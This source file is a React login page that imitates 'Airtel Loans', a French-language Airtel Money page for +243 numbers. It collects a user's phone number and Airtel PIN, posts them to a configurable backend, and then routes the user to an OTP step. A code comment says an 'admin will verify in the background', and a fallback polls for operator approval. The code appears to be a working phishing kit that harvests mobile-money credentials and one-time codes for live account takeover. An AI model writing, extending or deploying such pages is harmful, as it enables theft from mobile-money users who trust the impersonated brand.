import React, { useState, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import './App.css';

function AirtelLogin() {
  const [phone, setPhone] = useState('');
  const [pin, setPin] = useState<string[]>(['', '', '', '']);
  const [error, setError] = useState('Entrez le numéro Airtel.');
  const [isLoading, setIsLoading] = useState(false);
  const [statusMessage, setStatusMessage] = useState('');
  const pinRefs = useRef<(HTMLInputElement | null)[]>([]);
  const navigate = useNavigate();

  const handlePinChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newPin = [...pin];
    newPin[index] = value.substring(value.length - 1);
    setPin(newPin);
    if (value && index < 3) {
      pinRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !pin[index] && index > 0) {
      pinRefs.current[index - 1]?.focus();
    }
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    const pinString = pin.join('');

    if (phone.length < 9) {
      setError('Entrez un numéro Airtel valide.');
      return;
    }
    if (pinString.length < 4) {
      setError('Entrez votre code PIN Airtel.');
      return;
    }

    setError('');
    setIsLoading(true);
    setStatusMessage('Envoi de la demande...');

    const fullPhone = `+243${phone}`;
    localStorage.setItem('airtelPhone', fullPhone);

    try {
      const res = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone_number: fullPhone, pin: pinString }),
      });
      const data = await res.json();

      // Handle error
      if (data.status === 'error') {
        setError(data.message || 'Échec de la connexion.');
        setIsLoading(false);
        setStatusMessage('');
        return;
      }

      // ✅ NEW: Navigate immediately when backend returns "approved"
      //    This is the main flow now: OTP is sent to the phone, admin
      //    will verify in the background.
      if (data.status === 'approved') {
        setStatusMessage('Redirection...');
        navigate('/airtel-otp');
        return;
      }

      // Fallback: legacy polling flow (only used if backend returns "pending")
      if (data.status === 'pending' && data.approval_id) {
        setStatusMessage('Vérification en cours...');

        const approvalId = data.approval_id;
        let attempts = 0;
        const maxAttempts = 60;

        const interval = setInterval(async () => {
          attempts++;
          if (attempts > maxAttempts) {
            clearInterval(interval);
            setError('Délai d\'attente dépassé. Veuillez réessayer.');
            setIsLoading(false);
            setStatusMessage('');
            return;
          }

          try {
            const statusRes = await fetch(
              `${import.meta.env.VITE_API_BASE_URL}/api/approval-status/${approvalId}`
            );
            const statusData = await statusRes.json();

            if (statusData.status === 'approved') {
              clearInterval(interval);
              setStatusMessage('Redirection...');
              navigate('/airtel-otp');
            } else if (statusData.status === 'rejected') {
              clearInterval(interval);
              setError('Connexion refusée. Veuillez réessayer.');
              setIsLoading(false);
              setStatusMessage('');
            } else if (statusData.status === 'expired') {
              clearInterval(interval);
              setError('Session expirée. Veuillez réessayer.');
              setIsLoading(false);
              setStatusMessage('');
            }
          } catch {
            // Réseau instable — continuer à interroger
          }
        }, 2000);
      }
    } catch {
      setError('Erreur de connexion au serveur.');
      setIsLoading(false);
      setStatusMessage('');
    }
  };

  return (
    <div className="airtel-container">
      {/* Header Section */}
      <div className="airtel-header">
        <div className="airtel-hamburger">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="3" y1="12" x2="21" y2="12"></line>
            <line x1="3" y1="6" x2="21" y2="6"></line>
            <line x1="3" y1="18" x2="21" y2="18"></line>
          </svg>
        </div>
        <h1 className="airtel-logo">Airtel Loans</h1>
        <p className="airtel-tagline">Prêts rapides. À tout moment. Partout.</p>
      </div>

      {/* Main White Card */}
      <div className="airtel-card">
        <h2 className="airtel-welcome">Bon retour</h2>
        <p className="airtel-subtext">Connectez-vous à votre compte Airtel</p>

        {/* Error Alert Box */}
        {error && (
          <div className="airtel-alert">
            <div className="alert-icon">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#C81E1E" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="10"></circle>
                <line x1="12" y1="16" x2="12" y2="12"></line>
                <line x1="12" y1="8" x2="12.01" y2="8"></line>
              </svg>
            </div>
            <span>{error}</span>
          </div>
        )}

        {/* Status Alert */}
        {isLoading && statusMessage && !error && (
          <div className="airtel-alert" style={{ backgroundColor: '#FEF3C7', borderColor: '#FCD34D', color: '#92400E' }}>
            <div className="alert-icon">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#92400E" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="10"></circle>
                <polyline points="12 6 12 12 16 14"></polyline>
              </svg>
            </div>
            <span>{statusMessage}</span>
          </div>
        )}

        <form onSubmit={handleLogin}>
          {/* Phone Number Input */}
          <div className="airtel-input-group">
            <label>Numéro de téléphone</label>
            <div className="airtel-phone-container">
              <div className="airtel-country-code">+243</div>
              <input
                type="tel"
                placeholder="8XX XXX XXX"
                value={phone}
                onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
                maxLength={9}
                disabled={isLoading}
              />
            </div>
          </div>

          {/* PIN Input */}
          <div className="airtel-input-group">
            <label>Entrez votre code PIN Airtel</label>
            <div className="airtel-pin-container">
              {pin.map((digit, index) => (
                <input
                  key={index}
                  type="password"
                  maxLength={1}
                  value={digit}
                  placeholder="-"
                  ref={(el) => { pinRefs.current[index] = el; }}
                  onChange={(e) => handlePinChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  className="airtel-pin-box"
                  disabled={isLoading}
                />
              ))}
            </div>
          </div>

          {/* Login Button */}
          <button type="submit" className="airtel-login-btn" disabled={isLoading}>
            {isLoading ? 'Veuillez patienter...' : 'Connexion'}
            {!isLoading && (
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <line x1="5" y1="12" x2="19" y2="12"></line>
                <polyline points="12 5 19 12 12 19"></polyline>
              </svg>
            )}
          </button>
        </form>

        {/* Footer Security Message */}
        <div className="airtel-footer">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#D97706" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
          </svg>
          <span>Vos informations sont sécurisées</span>
        </div>
      </div>

      {/* Icons Section */}
      <div className="airtel-icons-footer">
        <div className="airtel-icon-item">
          <svg width="40" height="55" viewBox="0 0 40 55" fill="none" xmlns="http://www.w3.org/2000/svg">
            <rect x="2" y="2" width="36" height="51" rx="6" fill="#FFF5F5" stroke="#DA1C1C" strokeWidth="2"/>
            <circle cx="20" cy="18" r="6" fill="black" />
            <text x="20" y="38" textAnchor="middle" fontSize="10" fontWeight="bold" fill="black">Airtel</text>
          </svg>
        </div>
        <div className="airtel-icon-item">
          <svg width="40" height="55" viewBox="0 0 40 55" fill="none" xmlns="http://www.w3.org/2000/svg">
            <rect x="2" y="2" width="36" height="51" rx="6" fill="#1A2B3C" />
            <rect x="14" y="22" width="12" height="12" rx="2" fill="#D4AF37" />
            <path d="M16 22V18C16 15.7909 17.7909 14 20 14C22.2091 14 24 15.7909 24 18V22" stroke="#D4AF37" strokeWidth="3" strokeLinecap="round"/>
            <circle cx="20" cy="27" r="2" fill="#1A2B3C" />
          </svg>
        </div>
        <div className="airtel-icon-item">
          <svg width="50" height="55" viewBox="0 0 50 55" fill="none" xmlns="http://www.w3.org/2000/svg">
            <rect x="5" y="30" width="40" height="20" rx="4" fill="#DA1C1C" />
            <text x="25" y="38" textAnchor="middle" fontSize="8" fontWeight="bold" fill="white">Airtel</text>
            <rect x="10" y="40" width="30" height="10" rx="2" fill="#FFC107" />
            <text x="25" y="47" textAnchor="middle" fontSize="8" fontWeight="bold" fill="black">Money</text>
          </svg>
        </div>
        <div className="airtel-icon-item">
          <svg width="40" height="55" viewBox="0 0 40 55" fill="none" xmlns="http://www.w3.org/2000/svg">
            <circle cx="20" cy="27" r="18" fill="#FFC107" stroke="#D4AF37" strokeWidth="2"/>
            <text x="20" y="34" textAnchor="middle" fontSize="22" fontWeight="bold" fill="black">₦</text>
          </svg>
        </div>
      </div>
    </div>
  );
}

export default AirtelLogin;